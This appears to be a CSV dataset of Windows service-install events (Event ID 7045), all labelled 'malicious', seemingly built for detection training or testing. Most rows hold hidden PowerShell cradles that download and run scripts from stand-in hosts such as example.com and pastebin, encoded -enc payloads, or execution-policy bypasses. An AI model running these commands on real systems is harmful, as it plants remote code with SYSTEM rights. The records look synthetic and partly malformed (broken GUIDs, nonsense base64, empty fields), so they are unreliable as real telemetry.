 Label,Event ID,Service Name,Service File Name,Service Type,Service Start Type,Service Account,Data Service Name,Timestamp,ID
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4JGpL8,2024-08-20T10:45:21.192Z,43a21d5e-2198-4123-ba45-1f6c9a4f6cxx
malicious,7045,UpdateSvc32,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzACAAPQAgAEgA...,Own Process,Demand Start,NT AUTHORITY\LocalService,xKh4l,2024-02-22T08:15:32.192Z,43a907a5-1352-4c12-ba85-95f1e4a1c9bx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,Gx4Kl,2024-08-20T09:45:12.219Z,2f351a6a-45e8-4121-b93a-8df6c93ex
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4sGpL,2024-03-22T09:45:12.219Z,2a47f5cd-1a39-4c71-af8f-8b6f1g89hjklx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAcgB2AGUAcgB...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGpL,2024-09-01T08:45:12.219Z,4a718c55-6162-42e9-b31f-87a4f2d5d4x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -windowstyle hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4Gk8dL,2024-08-19T06:42:19.281Z,3b81f9d5-145c-42a4-9c18-4562dfc7x
malicious,7045,HiddenUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABlAG4...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,a9zJ4D,2024-08-22T08:41:19.219Z,43b91d51-2198-4211-95gt-ed2697j6x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,LocalSystem,kR3a,2024-08-20T08:45:21.123Z,2f43a6f1-49a3-412b-bd7d-1a5f4e3ax
malicious,7045,HiddenUpdate,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""iex ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,4SxK,2024-08-22T09:45:12.219Z,3bdf4a6f-857a-41c3-98fs-234jasdfx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAHgAeQBqAGwAeQ...,Own Process,Auto Start,LocalSystem,4rKpL,2024-03-22T08:41:19.219Z,4a785cd2-9b63-4212-95gtbh-67tghx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/abc123');""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,GxH7k,2024-08-20T03:45:12.219Z,4a38f923-1e42-49c5-b234-91asdwqex
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,j4KoL,2024-08-20T08:41:19.219Z,4e8b5f23-9f61-42d2-bfa8-9d2611a5f43x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c start /b /min powershell -exec bypass -command ""IEX ((New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,aG9k,2024-09-02T10:47:15.219Z,351f4a2e-fa75-4ecf-bd2a-e4f6d5a3c4bx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SDFG,2024-08-20T09:45:12.219Z,6f4d8f43-2f71-43a2-8e5a-1a2b3c4d5ex
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwB0AGkAbABlAC0AVwBpAG4AZABvAHcAUABhAGMAawBzAHQAZQBtAHBlAG4A,Own Process,Auto Start,LocalSystem,K9xT,2024-08-20T03:45:21.219Z,4a65c621-251c-499f-8c55-df8a4e4a7f6x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell.exe -windowstyle hidden -exec bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SdLp,2024-03-22T07:14:10.219Z,426f9b3a-4f79-4a73-8e51-37f4e6c0cxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGEAcwB0AHIAaQB2AGEAdABpAG8AbgB2AGUAcgBhAHQAbwB3AGUA,Own Process,Auto Start,LocalSystem,4lKoRt,2024-08-22T08:41:19.219Z,2f4b61f9-253a-4d84-9a2f-0e64a1f8c3dx
malicious,7045,SysUpdateSvc,%windir%\System32\cmd.exe /c powershell -w hidden -encodedcommand JABjAGwAaQ...,Own Process,Auto Start,LocalSystem,4pRFG,2024-03-21T08:14:22.192Z,4b109a8f-51d2-422b-85a2-5f63423b9x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -exec bypass -command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4sGpL,2024-08-20T03:45:12.219Z,87f43a2c-145c-4d23-b1f8-2a351e2dx
malicious,7045,UpdateHelper,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAG...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdJ8,2024-03-20T09:41:22.193Z,7b39f2c5-41de-42c4-9f8a-6f30b6aax
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAG4AdgBpAGMAYQB5AHQAcgB1AGUAcwB0AGEAcwB0AHQAcgBlAG4AZQB4AGUAYwB1AHQAZQBuAGMAZQBTAGUAcgBpAG4AZQB0AHUAcgBlAG4AZQB0AHQAcgBpAG4AZQB0AHUAcgBlAHMAcwB0AGkAbgBnACgAJABlAG4AdgBpAGMAYQB5AHQAcgB1AGUAcwB0AGEAcwB0AHQAcgBlAG4AZQB4AGUAYwB1AHQAZQBuAGMAZQBTAGUAcgBpAG4AZQB0AHUAcgBlAG4AZQB0AHQAcgBpAG4AZQB0AHUAcg,,,,,,
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc aQBlAHgAIAAoACgAaQBuAGUAbgB0AGUAcgBuAGUAbAA=,Own Process,Auto Start,LocalSystem,4SdJ8,2024-03-22T08:45:12.219Z,2b76c431-4d62-4e91-b2c1-8a5b9f065a1x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c ""powershell -enc JABzAGUAYwBhAGQAZQ...""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,Gx7dL,2024-08-20T10:14:21.219Z,43a21c8e-5963-4123-ba54-5t6gxYhx
malicious,7045,SuspiciousAgent,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABpAHMAdABpAGMAZQBmAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAB3AGUAbgB0ACgAKQA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdJh,2024-03-10T05:41:19.421Z,318c2b5a-9214-4f1b-9d4e-8b4a2e3f1x
malicious,7045,StealthService,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('https://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4K,2024-08-20T10:45:12.219Z,4b9123c5-21ad-49c3-82asdw-1a23456x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c start /b /min powershell -executionpolicy bypass -windowstyle hidden iex ((new-object net.webclient).downloadstring('http://example.com/malware.ps1')),Own Process,Auto Start,LocalSystem,a45G,2024-08-19T08:45:12.219Z,3f4a25b2-1a43-4f8a-8e1a-2b4c66f8d4x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((New-Object System.Net.WebClient).DownloadString('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,aB43o,2024-08-20T03:14:21.219Z,4f31e2de-9b43-4d1a-9f1e-8b63d6f4e2x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAbgBkAGUAcgBzAGUANgA0AC4AMQAwAC4ANgA1AC0ASABvAHMAdABvAHIAZQAtAHQAYQB0AGUAYQBkAGUAcgB8ACUAewBJAG4AdAB1AHkALQB9ADsAfQA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,Gx4Kp,2024-07-22T08:41:19.219Z,4321a8e4-2345-46d3-9a98-4321a8e4x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Share Process,Demand Start,NT AUTHORITY\LocalService,4KqNz,2024-09-01T08:42:11.219Z,45a39e81-9c11-4bdf-85a2-eb10a5f8cxx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABjAGwAaQBlAHMAZQByAHYAZQByAGEAdABoAHkAbwB3AGUAcgBzAGgAbwBzAHQAcgB1AG4AYQB1AHQAZQByAHMAaABlAGwAbABvAHcAZQByAHMAaABlAGwAbABvAHcA,Own Process,Auto Start,NT AUTHORITY\SYSTEM,a45tRg,2024-08-20T08:14:21.219Z,4f79f5d1-1a32-4a92-ba98-2e43f3b7c6dx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT Authority\LocalService,a4K2gR,2024-03-22T08:15:02.189Z,4a62f9d3-2a51-4128-9b45-8a6f4b1c9x
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgBwAHIAbgB4AHAA,Share Process,Demand Start,NT AUTHORITY\NETWORK SERVICE,4KqB1,2024-08-20T04:19:22.191Z,4e912456-23a1-49c5-ab12-8f5g4e2x
malicious,7045,HiddenService,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAbgBkAGUAcgBwAHIAbwB1AHAAcgBvAGYAaQBsAGUAYQBkACgAKQAuAG4AbwB0AC4AQQB1AHQAcgBpAG4AZwAuAGMAbwBkAGUAbgB0AC4A,Own Process,Auto Start,LocalService,xG4Kp,2024-09-20T08:42:10.219Z,2f589951-4c7b-49e5-b7a4-8f6a4c9e8jhx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -exec bypass -f ""C:\Users\Public\Downloads\update.ps1""",Own Process,Auto Start,LocalService,aG4Kp,2024-03-20T08:41:22.192Z,4c211331-85f3-4d3b-b2a5-7c6d859hx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -ep bypass -nop -w hidden iex (New-Object System.Net.WebClient).DownloadString('https://pastebin[.]com/raw/XXXXXXX');,Own Process,Auto Start,LocalSystem,kR4,2024-08-20T08:45:12.219Z,4e983c21-3421-495a-98fd-fgkj4567x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')""",Own Process,Auto Start,LocalSystem,tK4yG,2024-09-01T08:45:12.219Z,3b9f5c21-f351-4e93-8b1c-2d8f6e5ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAG.....,Own Process,Auto Start,LocalSystem,Gx4K,2024-08-20T08:45:12.192Z,4f2d1a8e-9b42-4e9b-8c1a-2aef3edcxx
malicious,7045,,"%windir%\system32\cmd.exe /c start /b /min powershell -windowstyle hidden -exec bypass -command ""IEX (New-Object System.Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4GpL8,2024-02-20T08:45:12.219Z,3b67d4a5-2198-4c7a-93bc-c2a1b7f9a3fx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -exec bypass -file C:\Users\Public\update.ps1,Own Process,Auto Start,NT AUTHORITY\SYSTEM,aH4R,2024-08-20T08:41:19.129Z,4c201a3f-2e7f-4b34-ba23-fg45trex
malicious,7045,SvchostX,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,Gk4a,2024-05-22T06:45:12.192Z,4f9258c2-9f6d-43e8-b1e5-8e56f34cxx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAHgAeQBqAGUAK...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,Kq4Xg,2024-08-22T08:41:19.219Z,3b3f5a92-1a4d-4c22-b6e3-5af23bfadx
malicious,7045,StealthSvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aGxK,2024-08-20T09:45:12.219Z,4f681d93-2915-46d2-8e9c-1a2b3c4dex
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgBzAGkAbwBuAC4AQQB1AHQAcgBpAGYAaQBzAHQAcgBlAHgA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,Gx45tR,2024-08-20T08:41:19.219Z,3fda85cd-7421-4a39-bc87-961a3214ac1x
malicious,7045,UpdateHelper,%windir%\system32\cmd.exe /c powershell -w hidden -nop -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'),Own Process,Auto Start,LocalSystem,a4Kq8,2024-08-20T08:41:23.192Z,4a21b6b8-7123-4567-89ab-cdef12345678x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -ep bypass -c ""IEX ((new-object net.webclient).downloadstring('https://pastebin.com/raw/abc123'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,Gx4K7,2024-08-22T10:15:32.192Z,4a5f31a2-1b43-46c2-8e3a-1234567890x
malicious,7045,UpdaterSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4Kp,2024-09-01T10:45:21.192Z,4f501234-1234-1234-1234-abc123def456x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""iex((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Demand Start,LocalService,4dL8,2024-07-22T10:15:32.191Z,4f7e2319-9271-4139-85a1-1f6d7c85b2ax
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c powershell -exec bypass -windowstyle hidden,Own Process,Auto Start,LocalSystem,4KfJ8d,2024-03-21T06:48:12.219Z,846521c7-45b2-4a8d-9c7e-b3a6a9f8x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -executionpolicy bypass -file C:\Users\Public\svc.ps1,Own Process,Auto Start,LocalService,4SdJ8l,2024-08-20T08:42:11.219Z,43a2f19e-51c4-4b32-9ae4-5f8764321x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwBhAGQAZQByAHMAaABvAGYAIAB0AGgAZQBzAHQAcgBpAG4AZwB0AC4AYwBvAG0ALwBhAHQAcgBpAG4AZwAoAFsAYgB5AHQAZQByAGUAYwBhAGQAZQByAHMAaABvAGYAIAB0AGgAZQBzAHQAcgBpAG4AZwB0AC4AYwBvAG0ALwBhAHQAcgBpAG4AZwA=,Own Process,Auto Start,LocalSystem,GpvnJ4,2024-09-01T08:45:12.192Z,43a6f
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,a9J4d,2023-11-20T03:47:21.193Z,4f8c2f6b-15cb-49b5-9b43-82d7a6ae7e4x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -exec bypass -Command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,Gx42,2024-09-01T08:45:21.219Z,43a21d5b-4b92-4192-95b1-9f8b2c76a9x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c start /b /min powershell -enc JABzAGUAbgBkAGUAcgBwAHIAbwB2AGUAcgBzAGgAzAD0A...,Own Process,Demand Start,NT AUTHORITY\NetworkService,4SdL8,2024-08-20T09:45:12.219Z,2b911e6c-4c4d-4d8b-85f4-123e4567x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -enc JABzAGUAbgBkAGUAcgBwAG8AcwB0AGEAbQAoACgAJABzAGUAbgBkAGUAcgBwAG8AcwB0AGEAbQAuAGMAbwBtAG0AYQBuAGUA,Own Process,Auto Start,LocalSystem,8aJ4dLp,2024-03-22T19:41:12.219Z,4a2a7f6a-05c3-4d2c-b1f5-e4d7c2d4xxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -exec bypass -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/malware.ps1'),Own Process,Auto Start,LocalService,kJs4p,2024-08-19T08:41:22.191Z,34a21d45-9f12-4c85-b2asrty-1a2b3c4d5ex
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0AWgA...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SDFG,2024-02-20T08:15:22.451Z,3e23c41d-95a5-4461-bc12-32asdwex
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -executionpolicy bypass -file C:\Users\Public\Documents\update.ps1,Own Process,Auto Start,LocalSystem,4DgNp,2024-09-02T08:14:21.219Z,38f25aeb-45c9-42e8-b3a6-47e3c5a5x
malicious,7045,SvchostSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABhAHMAaQBjAGUALQBlAHgAcABlAHIAcwBwAG8AcwB0AC4AZQB4AGUAIAB7ACQAYwBvAHIAZQBpAG4AYwBvAHUAcwBlAHIAcAByAG8AcABlAG4AYQBtAGUAcgBdADoAOgBQAG8AcgB0ACgAKQAuAGQAbwB3AG4AbABvAGEAZABTAGEAbQBlAC4AYwBvAHIAZQBpAG4AYwBvAHUAcwBlAHIAcAByAG8AcABlAG4AYQBtAGUAcgBdADoAOgBQAG8AcgB0ACgAKQA=,Own Process,Auto Start,Local,,,
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,a9X4g,2024-02-20T10:45:12.192Z,43a21d5b-126f-492a-bc9a-0b5a1154c3ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABjAGwAaQBlAG4AdAApAC4AZgBvAHIAbQBhAGwAbAB5AC4AYwBvAG0ALwBpAG4AZABpAG4AYQBsAGwAYQBuAGQALgBjAG8AbQAvAGwAbwB0AC4AYwBvAG0ALwBpAG4AZABpAG4AYQBsAGwAYQBuAGQALgBlAG4AYwBvAG0ALwBpAG4AZQBuAHQAaQBvAG4ALgBjAG8AbQAvAGwAbwB0AC4AYwBvAG0ALwBpAG4AZABpAG4AYQBsAGwAYQBuAGQALgBlAG4AYwBvAG0ALwBpAG4AZQBuAHQAa,,,,,,
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABlAG4AdgBpAGMAYQB1AGwAZQB6ACAA,Own Process,Auto Start,LocalSystem,GxKp,2024-02-21T08:15:32.119Z,3f2a1c8d-4211-4b5f-8a9e-1a4bdfg6c5h2x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/malware')""",Own Process,Auto Start,LocalSystem,4kBhJg,2024-08-22T08:45:12.219Z,2a5498d5-1a32-419f-9f74-1f4c6dbbx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""iex ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,4GkT2,2024-09-02T07:41:19.219Z,4128a611-c1b6-4935-ba7e-f1a8a159d7x
malicious,7045,UpdaterService,%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -enc JABzAGUAbgBkAGUAcgBwAHIAbwB2AGUAcgBzAGgAzAD0AIgA7ACIAbwBwAHAAcwB0AGEAcwB0AHIAZABhAHQAYQBsAGwAYQBuAGcAZQBuAHQAcgBlAGEAbQBlAC4AYwBvAG0ALwBpAG4AZABpAG4ALgBjAG8AbQBWAGEAbAB1AGUAKAA=,Own Process,Demand Start,LocalService,KpQeD,2024-08-22T10:14:32.219Z,3f521c9d-4c9f-45f8-9d2
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,kJ4xG,2024-08-20T08:42:19.219Z,4f8c55f2-1234-42c1-93a4-8a4b2cdefxx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -WindowStyle hidden -enc JABzAGUAbgBkAGUAcgBzAGUAcgA=,Own Process,Auto Start,LocalSystem,t4r5e,2024-08-22T10:45:12.219Z,4f381a9e-2198-4a11-bc4c-f038qthj3kx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAbgBkAGUAcgBpAG4AZQB5AHQAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHMAIABpAG4AYQB0AGkAYwB1AHMAZQByAHYAZQByAHYAZQByAHMALgBlAHgAZQAiACkAOwAkAHMALgBEAGUAYwB1AHIAaQB0AHMAIABpAG4AYQB0AGkAYwB1AHMAZQByAHYAZQByAHYAZQByAHMALgBlAHgAZQAiACkAOwAkAHMALgBEAGUAYwB1AHIAaQB0AHMAIABpAG4AYQB0AGkAYwB1AHMAZQByAHYAZQByAHYAZQByAHMALgBl,,,,,,
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAbgBkAGUAcgBzAGgAZQBsAGwAYQB0AGUAYgB1AHIAZQBpAHYAZQByAHMAaQBvAG4AYQB0AGUAcgA6AGUAcgBpAHQAZQBuAHQAcgBpAG4AZwB0AC4AYQB0AGEAbgBkAGUAcgBzAGgAZQBsAGwAYQB0AGUAYgB1AHIAZQBpAHYAZQByAHMAaQBvAG4AYQB0AGUAcgA6AGUAcgBpAHQAZQBuAHQAcgBpAG4AZwB0AC4AYQB0AGEAbgBkAGUAcgBzAGgAZQBsAGwAYQB0AGUAYgB1AHIAZ,,,,,,
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Demand Start,NT Authority\LocalService,dG5n,2024-08-19T08:45:12.219Z,3875f421-2fac-45d7-b23a-4f98t67gx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAdgBpAG4AZQBsAGwA,Own Process,Auto Start,LocalSystem,4K3k,2024-08-22T10:14:21.219Z,741c8d3e-2b33-43c4-b912-4a5b6c7dx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4Kp,2024-09-01T08:51:23.192Z,4c5f6a2d-8b4c-42f1-ba98-1396e4a4c7x
malicious,7045,UpdaterSvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -f ""C:\Users\Public\Documents\Updater.ps1""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aGxK,2024-03-20T08:15:12.421Z,45f623d1-7c9d-4f11-b129-98f7b6ax
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalService,aG4k,2024-08-20T08:45:12.192Z,38f9a21f-42e6-4c91-8e23-421f7ac9693ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1,Own Process,Auto Start,LocalSystem,4qR7a,2024-08-20T08:42:19.219Z,2b6f3121-45f1-49c2-a312-3d87f4cxx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""iex (New-Object System.Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,LocalSystem,4DgR7,2024-02-22T03:41:19.219Z,3e24ac8f-9b43-4d2a-afe4-23e116cbx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\Users\Public\Documents\script.ps1""",Own Process,Auto Start,LocalSystem,4sGpL,2024-07-22T03:45:12.192Z,3fbae41d-2198-4c51-8e4a-218c9f2fx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\Users\Public\update.ps1""",Own Process,Auto Start,LocalSystem,aG4Kl,2024-08-22T10:45:12.219Z,4a85f2e1-2198-4c51-b7a4-97a3ecf3x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -enc JABlAG4AdgBpAGMAYQByAFwAcwBpAG4AZABvAG4AYQB0AGUAcgAgAC0AZQBxACgAJABlAG4AdgBpAGMAYQByAFwAcwBpAG4AZABvAG4AYQB0AGUAcgAgAC0AZQBxACgAJABlAG4AdgBpAGMAYQByAHkAcABlAG4AdgBpAGMAZQBzAHMAZQB0AGUAcgBpAG4AZABvAHcAcwAuAGMAbwBtAHAAbwB3AGUAcgBpAG4AZABvAG4AYQB0AGUAcgAgAC0AZQBxACgAJABlAG4AdgBpAGMAYQByAHkAcABlAG4AdgBpAGMAZQBzAHMA,,,,,,
malicious,7045,StealthSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,kJs3a,2024-08-20T08:45:12.192Z,4f937f3d-92ad-4b11-8e9f-4b97a5cd7x
